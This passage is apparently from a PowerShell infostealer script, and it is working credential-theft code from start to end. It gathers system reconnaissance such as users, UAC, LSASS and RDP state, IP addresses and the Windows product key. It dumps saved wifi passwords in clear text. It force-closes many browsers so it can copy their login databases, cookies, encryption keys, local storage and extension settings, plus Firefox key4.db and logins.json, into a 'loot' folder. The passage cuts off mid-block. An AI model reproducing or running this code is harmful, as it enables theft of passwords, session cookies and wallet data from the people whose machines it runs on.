$GeoLocation = $GeoLocation -split " "

$Lat = $GeoLocation[0].Substring(11) -replace ".$"

$Lon = $GeoLocation[1].Substring(10) -replace ".$"

############################################################################################################################################################

# local-user

$luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 

############################################################################################################################################################

Function Get-RegistryValue($key, $value) {  (Get-ItemProperty $key $value).$value }

$Key = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" 
$ConsentPromptBehaviorAdmin_Name = "ConsentPromptBehaviorAdmin" 
$PromptOnSecureDesktop_Name = "PromptOnSecureDesktop" 

$ConsentPromptBehaviorAdmin_Value = Get-RegistryValue $Key $ConsentPromptBehaviorAdmin_Name 
$PromptOnSecureDesktop_Value = Get-RegistryValue $Key $PromptOnSecureDesktop_Name

If($ConsentPromptBehaviorAdmin_Value -Eq 0 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "Never notIfy" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 0){ $UAC = "NotIfy me only when apps try to make changes to my computer(do not dim my desktop)" } 

ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 5 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "NotIfy me only when apps try to make changes to my computer(default)" }
 
ElseIf($ConsentPromptBehaviorAdmin_Value -Eq 2 -And $PromptOnSecureDesktop_Value -Eq 1){ $UAC = "Always notIfy" }
 
Else{ $UAC = "Unknown" } 

############################################################################################################################################################

$lsass = Get-Process -Name "lsass"

if ($lsass.ProtectedProcess) {$lsass = "LSASS is running as a protected process."} 

else {$lsass = "LSASS is not running as a protected process."}

############################################################################################################################################################

$StartUp = (Get-ChildItem -Path ([Environment]::GetFolderPath("Startup"))).Name

############################################################################################################################################################

# Get nearby wifi networks

try
{
$NearbyWifi = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
}
catch
{
$NearbyWifi="No nearby wifi networks detected"
}

############################################################################################################################################################

# Get info about pc

# Get IP / Network Info

try{$computerPubIP=(Invoke-WebRequest ipinfo.io/ip -UseBasicParsing).Content}
catch{$computerPubIP="Error getting Public IP"}

try{$localIP = Get-NetIPAddress -InterfaceAlias "*Ethernet*","*Wi-Fi*" -AddressFamily IPv4 | Select-Object InterfaceAlias, IPAddress, PrefixOrigin | Out-String}
catch{$localIP = "Error getting local IP"}

$MAC = Get-NetAdapter -Name "*Ethernet*","*Wi-Fi*"| Select-Object Name, MacAddress, Status | Out-String

# Check RDP

if ((Get-ItemProperty "hklm:\System\CurrentControlSet\Control\Terminal Server").fDenyTSConnections -eq 0) { 
	$RDP = "RDP is Enabled" 
} else {
	$RDP = "RDP is NOT enabled" 
}

############################################################################################################################################################

#Get System Info
$computerSystem = Get-CimInstance CIM_ComputerSystem

$computerSystemProduct = Get-WmiObject -Class Win32_ComputerSystemProduct

$computerName = $computerSystem.Name

$computerModel = $computerSystem.Model

$computerManufacturer = $computerSystem.Manufacturer

$computerUUID =  $computerSystemProduct.UUID

$computerBIOS = Get-CimInstance CIM_BIOSElement  | Out-String

$computerOs=Get-WMIObject win32_operatingsystem | Select-Object Caption, Version  | Out-String

$computerCpu=Get-WmiObject Win32_Processor | Select-Object DeviceID, Name, Caption, Manufacturer, MaxClockSpeed, L2CacheSize, L2CacheSpeed, L3CacheSize, L3CacheSpeed | Format-List  | Out-String

$computerMainboard=Get-WmiObject Win32_BaseBoard | Format-List  | Out-String

$computerRamCapacity=Get-WmiObject Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | % { "{0:N1} GB" -f ($_.sum / 1GB)}  | Out-String

$computerRam=Get-WmiObject Win32_PhysicalMemory | Select-Object DeviceLocator, @{Name="Capacity";Expression={ "{0:N1} GB" -f ($_.Capacity / 1GB)}}, ConfiguredClockSpeed, ConfiguredVoltage | Format-Table  | Out-String

$computerWindowsKey=Get-WmiObject SoftwareLicensingService | Select-Object OA3xOriginalProductKey, OA3xOriginalProductKeyDescription, OA3xOriginalProductKeyPkPn | Format-List | Out-String

############################################################################################################################################################

# Get Computer Info Formatted
$pcinfo=Get-ComputerInfo > $env:TEMP\$FolderName/computerInfoFormatted.txt

############################################################################################################################################################

$ScheduledTasks = Get-ScheduledTask

############################################################################################################################################################

$klist = klist sessions

############################################################################################################################################################

$RecentFiles = Get-ChildItem -Path $env:USERPROFILE -Recurse -File | Sort-Object LastWriteTime -Descending | Select-Object -First 50 FullName, LastWriteTime

############################################################################################################################################################

# Get HDDs
$driveType = @{
   2="Removable disk "
   3="Fixed local disk "
   4="Network disk "
   5="Compact disk "}
$Hdds = Get-WmiObject Win32_LogicalDisk | Select-Object DeviceID, VolumeName, @{Name="DriveType";Expression={$driveType.item([int]$_.DriveType)}}, FileSystem,VolumeSerialNumber,@{Name="Size_GB";Expression={"{0:N1} GB" -f ($_.Size / 1Gb)}}, @{Name="FreeSpace_GB";Expression={"{0:N1} GB" -f ($_.FreeSpace / 1Gb)}}, @{Name="FreeSpace_percent";Expression={"{0:N1}%" -f ((100 / ($_.Size / $_.FreeSpace)))}} | Format-Table DeviceID, VolumeName,DriveType,FileSystem,VolumeSerialNumber,@{ Name="Size GB"; Expression={$_.Size_GB}; align="right"; }, @{ Name="FreeSpace GB"; Expression={$_.FreeSpace_GB}; align="right"; }, @{ Name="FreeSpace %"; Expression={$_.FreeSpace_percent}; align="right"; } | Out-String

#Get - Com & Serial Devices
$COMDevices = Get-Wmiobject Win32_USBControllerDevice | ForEach-Object{[Wmi]($_.Dependent)} | Select-Object Name, DeviceID, Manufacturer | Sort-Object -Descending Name | Format-Table | Out-String -width 250

############################################################################################################################################################

# Get Network Interfaces
$NetworkAdapters = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | Select-Object Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress | Out-String -width 250

$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String

############################################################################################################################################################

# process first
$process=Get-WmiObject win32_process | Select-Object Handle, ProcessName, ExecutablePath, CommandLine | Sort-Object ProcessName | Format-Table Handle, ProcessName, ExecutablePath, CommandLine | Out-String -width 250

# Get Listeners / ActiveTcpConnections
$listener = Get-NetTCPConnection | Select-Object @{Name="LocalAddress";Expression={$_.LocalAddress + ":" + $_.LocalPort}}, @{Name="RemoteAddress";Expression={$_.RemoteAddress + ":" + $_.RemotePort}}, State, AppliedSetting, OwningProcess
$listener = $listener | foreach-object {
    $listenerItem = $_
    $processItem = ($process | where { [int]$_.Handle -like [int]$listenerItem.OwningProcess })
    new-object PSObject -property @{
      "LocalAddress" = $listenerItem.LocalAddress
      "RemoteAddress" = $listenerItem.RemoteAddress
      "State" = $listenerItem.State
      "AppliedSetting" = $listenerItem.AppliedSetting
      "OwningProcess" = $listenerItem.OwningProcess
      "ProcessName" = $processItem.ProcessName
    }
} | select LocalAddress, RemoteAddress, State, AppliedSetting, OwningProcess, ProcessName | Sort-Object LocalAddress | Format-Table | Out-String -width 250 

# service
$service=Get-WmiObject win32_service | select State, Name, DisplayName, PathName, @{Name="Sort";Expression={$_.State + $_.Name}} | Sort-Object Sort | Format-Table State, Name, DisplayName, PathName | Out-String -width 250

# installed software (get uninstaller)
$software=Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | where { $_.DisplayName -notlike $null } |  Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Sort-Object DisplayName | Format-Table -AutoSize | Out-String -width 250

# drivers
$drivers=Get-WmiObject Win32_PnPSignedDriver| where { $_.DeviceName -notlike $null } | select DeviceName, FriendlyName, DriverProviderName, DriverVersion | Out-String -width 250

# videocard
$videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcessor, DriverVersion, CurrentHorizontalResolution, CurrentVerticalResolution | Out-String -width 250


############################################################################################################################################################

# OUTPUTS RESULTS TO LOOT FILE

$output = @"
Full Name: $fullName

Email: $email

GeoLocation:
Latitude:  $Lat 
Longitude: $Lon

------------------------------------------------------------------------------------------------------------------------------

Local Users:
$luser

------------------------------------------------------------------------------------------------------------------------------

UAC State:
$UAC

LSASS State:
$lsass

RDP State:
$RDP

------------------------------------------------------------------------------------------------------------------------------

Public IP: 
$computerPubIP

Local IPs:
$localIP

MAC:
$MAC

------------------------------------------------------------------------------------------------------------------------------

Computer Name:
$computerName

Model:
$computerModel

Manufacturer:
$computerManufacturer

UUID:
$computerUUID

BIOS:
$computerBIOS

OS:
$computerOs

CPU:
$computerCpu

Mainboard:
$computerMainboard

Ram Capacity:
$computerRamCapacity

Total installed Ram:
$computerRam

Video Card: 
$videocard

Windows Key:
$computerWindowsKey

------------------------------------------------------------------------------------------------------------------------------

Contents of Start Up Folder:
$StartUp

------------------------------------------------------------------------------------------------------------------------------

Scheduled Tasks:
$ScheduledTasks

------------------------------------------------------------------------------------------------------------------------------

Logon Sessions:
$klist

------------------------------------------------------------------------------------------------------------------------------

Recent Files:
$RecentFiles

------------------------------------------------------------------------------------------------------------------------------

Hard-Drives:
$Hdds

COM Devices:
$COMDevices

------------------------------------------------------------------------------------------------------------------------------

Network Adapters:
$NetworkAdapters

------------------------------------------------------------------------------------------------------------------------------

Nearby Wifi:
$NearbyWifi

Wifi Profiles: 
$wifiProfiles

------------------------------------------------------------------------------------------------------------------------------

Process:
$process

------------------------------------------------------------------------------------------------------------------------------

Listeners:
$listener

------------------------------------------------------------------------------------------------------------------------------

Services:
$service

------------------------------------------------------------------------------------------------------------------------------

Installed Software: 
$software

------------------------------------------------------------------------------------------------------------------------------

Drivers: 
$drivers

------------------------------------------------------------------------------------------------------------------------------

"@

$output > $env:TEMP\$FolderName/computerData.txt

############################################################################################################################################################

New-Item -Path "$env:tmp/$FolderName/Browsers" -ItemType Directory

function Get-BrowserData {

    [CmdletBinding()]
    param (	
    [Parameter (Position=1,Mandatory = $True)]
    [string]$Browser,    
    [Parameter (Position=1,Mandatory = $True)]
    [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    if     ($Browser -eq 'chrome'  -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"}
    elseif ($Browser -eq 'chrome'  -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"}
    elseif ($Browser -eq 'edge'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:USERPROFILE/AppData/Local/Microsoft/Edge/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'opera'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/Opera Software/Opera Stable/History"}
    elseif ($Browser -eq 'opera'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/Opera Software/Opera Stable/Bookmarks"}
    elseif ($Browser -eq 'operagx'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/Opera Software/Opera GX Stable/History"}
    elseif ($Browser -eq 'operagx'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/Opera Software/Opera GX Stable/Bookmarks"}
    elseif ($Browser -eq 'yandex'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/../Local/Yandex/YandexBrowser/User Data/Default/History"}
    elseif ($Browser -eq 'yandex'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/../Local/Yandex/YandexBrowser/User Data/Default/Bookmarks"}
    elseif ($Browser -eq 'brave'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata/../Local/BraveSoftware/Brave-Browser/User Data/Default/History"}
    elseif ($Browser -eq 'brave'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata/../Local/BraveSoftware/Brave-Browser/User Data/Default/Bookmarks"}
	elseif ($Browser -eq 'chromebeta'    -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome Beta\User Data\Default\History"}
    elseif ($Browser -eq 'chromebeta'    -and $DataType -eq 'bookmarks' )  {$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome Beta\User Data\Default\Bookmarks"}
	elseif ($Browser -eq 'chromium'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\Chromium\User Data\Default\History"}
    elseif ($Browser -eq 'chromium'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\Chromium\User Data\Default\Bookmarks"}
	elseif ($Browser -eq '360chrome'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\360chrome\Chrome\User Data\Default\History"}
    elseif ($Browser -eq '360chrome'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\360chrome\Chrome\User Data\Default\Bookmarks"}
	elseif ($Browser -eq 'qqbrowser'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\Tencent\QQBrowser\User Data\Default\History"}
    elseif ($Browser -eq 'qqbrowser'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\Tencent\QQBrowser\User Data\Default\Bookmarks"}
	elseif ($Browser -eq 'vivaldi'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\Vivaldi\User Data\Default\History"}
    elseif ($Browser -eq 'vivaldi'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\Vivaldi\User Data\Default\Bookmarks"}
	elseif ($Browser -eq 'coccoc'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\CocCoc\Browser\User Data\Default\History"}
    elseif ($Browser -eq 'coccoc'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\CocCoc\Browser\User Data\Default\Bookmarks"}
	elseif ($Browser -eq 'dcbrowser'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\DCBrowser\User Data\Default\History"}
    elseif ($Browser -eq 'dcbrowser'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\DCBrowser\User Data\Default\Bookmarks"}
	elseif ($Browser -eq 'sogouexplorer'    -and $DataType -eq 'history'   )  {$Path = "$env:appdata\..\Local\SogouExplorer\Webkit\Default\History"}
    elseif ($Browser -eq 'sogouexplorer'    -and $DataType -eq 'bookmarks' )  {$Path = "$env:appdata\..\Local\SogouExplorer\Webkit\Default\Bookmarks"}
    elseif ($Browser -eq 'firefox' -and $DataType -eq 'history'   )  {$Path = "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"}
    

    $Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
    $Value | ForEach-Object {
        $Key = $_
        if ($Key -match $Search){
            New-Object -TypeName PSObject -Property @{
                User = $env:UserName
                Browser = $Browser
                DataType = $DataType
                Data = $_
            }
        }
    } 
}

Get-BrowserData -Browser "edge" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "edge" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "chrome" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "chromebeta" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "chromebeta" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "chromium" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "chromium" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "360chrome" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "360chrome" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "qqbrowser" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "qqbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "vivaldi" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "vivaldi" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "coccoc" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "coccoc" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "dcbrowser" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "dcbrowser" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "sogouexplorer" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "sogouexplorer" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "operagx" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "operagx" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "yandex" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "yandex" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "brave" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt
Get-BrowserData -Browser "brave" -DataType "bookmarks" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\$FolderName\Browsers\BrowserData.txt

function chromiumBrowser {
	
	[CmdletBinding()]
	param (
	[Parameter (Position=1,Mandatory = $True)]
	[string]$Path, 
	[Parameter (Position=1,Mandatory = $True)]
	[string]$Browser
	)
New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
Get-Content -Path "$path\User Data\Local State" > "$env:TMP\$FolderName\Browsers\$Browser\Local State"
if ([System.IO.File]::Exists("$path\User Data\default\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/default -ItemType Directory
	Get-Content -Path "$path\User Data\default\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Web Data"
	Get-Content -Path "$path\User Data\default\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Login Data"
	Get-Content -Path "$path\User Data\default\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\default\Preferences"
	Get-Content -Path "$path\User Data\default\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\default\Top Sites"
	Get-Content -Path "$path\User Data\default\History" > "$env:TMP\$FolderName\Browsers\$Browser\default\History"
	Get-Content -Path "$path\User Data\default\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\default\Bookmarks"
	Copy-Item "$path\User Data\default\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Local Storage\leveldb" -Recurse
	Copy-Item "$path\User Data\default\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\default\Local Extension Settings" -Recurse
	Copy-Item "$path\User Data\default\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\default\Sync Data\leveldb" -Recurse
}
if ([System.IO.File]::Exists("$path\User Data\Profile 1\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 1 -ItemType Directory
	Get-Content -Path "$path\User Data\Profile 1\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Web Data"
	Get-Content -Path "$path\User Data\Profile 1\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Login Data"
	Get-Content -Path "$path\User Data\Profile 1\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Preferences"
	Get-Content -Path "$path\User Data\Profile 1\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Top Sites"
	Get-Content -Path "$path\User Data\Profile 1\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\History"
	Get-Content -Path "$path\User Data\Profile 1\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Bookmarks"
	Copy-Item "$path\User Data\Profile 1\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Local Storage\leveldb" -Recurse
	Copy-Item "$path\User Data\Profile 1\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Local Extension Settings" -Recurse
	Copy-Item "$path\User Data\Profile 1\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 1\Sync Data\leveldb" -Recurse
}
if ([System.IO.File]::Exists("$path\User Data\Profile 2\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 2 -ItemType Directory
	Get-Content -Path "$path\User Data\Profile 2\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Web Data"
	Get-Content -Path "$path\User Data\Profile 2\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Login Data"
	Get-Content -Path "$path\User Data\Profile 2\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Preferences"
	Get-Content -Path "$path\User Data\Profile 2\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Top Sites"
	Get-Content -Path "$path\User Data\Profile 2\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\History"
	Get-Content -Path "$path\User Data\Profile 2\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Bookmarks"
	Copy-Item "$path\User Data\Profile 2\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Local Storage\leveldb" -Recurse
	Copy-Item "$path\User Data\Profile 2\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Local Extension Settings" -Recurse
	Copy-Item "$path\User Data\Profile 2\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 2\Sync Data\leveldb" -Recurse
}
if ([System.IO.File]::Exists("$path\User Data\Profile 3\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/Profile 3 -ItemType Directory
	Get-Content -Path "$path\User Data\Profile 3\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Web Data"
	Get-Content -Path "$path\User Data\Profile 3\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Login Data"
	Get-Content -Path "$path\User Data\Profile 3\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Preferences"
	Get-Content -Path "$path\User Data\Profile 3\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Top Sites"
	Get-Content -Path "$path\User Data\Profile 3\History" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\History"
	Get-Content -Path "$path\User Data\Profile 3\Bookmarks" > "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Bookmarks"
	Copy-Item "$path\User Data\Profile 3\Local Storage\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Local Storage\leveldb" -Recurse
	Copy-Item "$path\User Data\Profile 3\Local Extension Settings" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Local Extension Settings" -Recurse
	Copy-Item "$path\User Data\Profile 3\Sync Data\leveldb" "$env:TMP\$FolderName\Browsers\$Browser\Profile 3\Sync Data\leveldb" -Recurse
}

}

# Get FireFox Passwords
$key4 = Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include key4.db -Recurse -ErrorAction SilentlyContinue | % { $_.fullname }
if($key4 -ne $null){
taskkill /IM firefox.exe /F
Start-Sleep 1
New-Item -Path $env:tmp/$FolderName/Firefox -ItemType Directory
Get-Content $key4 > $env:TMP\$FolderName\Firefox\key4.db
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include logins.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\logins.json
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include cookies.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\cookies.sqlite
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include downloads.json -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\downloads.json
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include profile.ini -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\profile.ini
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include places.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\places.sqlite
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include webappsstore.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\webappsstore.sqlite
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include storage.sqlite -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\storage.sqlite
Get-Childitem -Path $env:appdata\Mozilla\Firefox\Profiles\ -Include "storage-sync-v2.sqlite" -Recurse -ErrorAction SilentlyContinue | Get-Content -Path { $_.fullname } | Write-Output > $env:TMP\$FolderName\Firefox\storage-sync-v2
}

# Get Chrome Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Google\Chrome\User Data\Local State")){
taskkill /IM chrome.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome" -Browser "Chrome"
}

# Get ChromeBeta Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Google\Chrome Beta\User Data\Local State")){
taskkill /IM chromebeta.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Google\Chrome Beta" -Browser "ChromeBeta"
}

# Get Chromium Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Chromium\User Data\Local State")){
taskkill /IM chromium.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Chromium" -Browser "Chromium"
}

# Get 360chrome Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\360chrome\Chrome\User Data\Local State")){
taskkill /IM 360chrome.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\360chrome\Chrome" -Browser "360Chrome"
}

# Get QQBrowser Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Tencent\QQBrowser\User Data\Local State")){
taskkill /IM qqbrowser.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Tencent\QQBrowser" -Browser "QQBrowser"
}

# Get Vivaldi Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\Vivaldi\User Data\Local State")){
taskkill /IM vivaldi.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\Vivaldi" -Browser "Vivaldi"
}

# Get CocCoc Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\CocCoc\Browser\User Data\Local State")){
taskkill /IM coccoc.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\CocCoc\Browser" -Browser "CocCoc"
}

# Get DCBrowser Passwords
if([System.IO.File]::Exists("$env:appdata\..\Local\DCBrowser\User Data\Local State")){
taskkill /IM dcbrowser.exe /F
Start-Sleep 1
chromiumBrowser -Path "$env:appdata\..\Local\DCBrowser" -Browser "DCBrowser"
}

# Get SogouExplorer Passwords
$path="$env:appdata\..\Local\SogouExplorer\Webkit"
if([System.IO.File]::Exists("$path\Local State")){
taskkill /IM sogou.exe /F
Start-Sleep 1
$Browser="Sogou"
New-Item -Path $env:tmp/$FolderName/Browsers/$Browser -ItemType Directory
Get-Content -Path "$path\Local State" > "$env:TMP\$FolderName\Browsers\$Browser\Local State"
if ([System.IO.File]::Exists("$path\User Data\default\Preferences")) {
	New-Item -Path $env:tmp/$FolderName/Browsers/$Browser/default -ItemType Directory
	Get-Content -Path "$path\default\Web Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Web Data"
	Get-Content -Path "$path\default\Login Data" > "$env:TMP\$FolderName\Browsers\$Browser\default\Login Data"
	Get-Content -Path "$path\default\Preferences" > "$env:TMP\$FolderName\Browsers\$Browser\default\Preferences"
	Get-Content -Path "$path\default\Top Sites" > "$env:TMP\$FolderName\Browsers\$Browser\default\Top Sites"
